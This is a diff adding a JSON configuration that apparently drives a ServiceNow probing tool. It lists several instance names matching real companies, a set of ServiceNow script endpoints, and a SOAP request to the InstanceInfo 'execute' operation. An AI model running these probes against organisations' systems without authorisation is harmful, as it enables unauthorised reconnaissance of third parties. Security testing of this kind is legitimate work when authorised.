@@ -1,0 +1,36 @@
+{
+    "instances": [
+      "aarons",
+      "ac3",
+      "academymortgage",
+      "accenturetest1",
+      "acxiom",
+      "aeritae"
+    ],
+    "endpoints": [
+      "/scripts/js_includes_last.jsx",
+      "/scripts/js_includes_amb.jsx",
+      "/scripts/js_includes_customer.jsx",
+      "/scripts/js_includes_form_presence.jsx",
+      "/scripts/js_includes_list_edit_doctype.jsx",
+      "/scripts/js_includes_sorting_new.jsx",
+      "/scripts/js_includes_ui16_form.jsx",
+      "/scripts/ui_policy.jsx",
+      "/scripts/form_tags.jsx",
+      "/scripts/magellan.CreateFavoriteModal.jsx",
+      "/scripts/transaction_scope_includes.jsx",
+      "/scripts/classes/doctype/js_includes_listv2_doctype.jsx",
+      "/scripts/doctype/js_includes_last_doctype.jsx",
+      "/scripts/doctype/z_last_include.js",
+      "/scripts/doctype/js_includes_legacy.jsx",
+      "/scripts/doctype/js_includes_doctype.jsx",
+      "/scripts/doctype/js_includes_last_doctype.jsx",
+      "/scripts/doctype/js_includes_navigator_doctype.jsx",
+      "/scripts/sn/concourse/js_includes_concourse.jsx",
+      "/scripts/app.guided_tours/js_guided_tours_includes.jsx",
+      "/scripts/heisenberg/heisenberg_all.jsx",
+      "/sn.dragdrop.jsdbx",
+      "/scripts/lib/newtag-it.jsx"
+    ],
+    "payload": "<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:ins='http://www.service-now.com/InstanceInfo'>\n<soapenv:Header/>\n\t<soapenv:Body>\n\t\t<ins:execute/>\n\t</soapenv:Body>\n</soapenv:Envelope>"
+  }
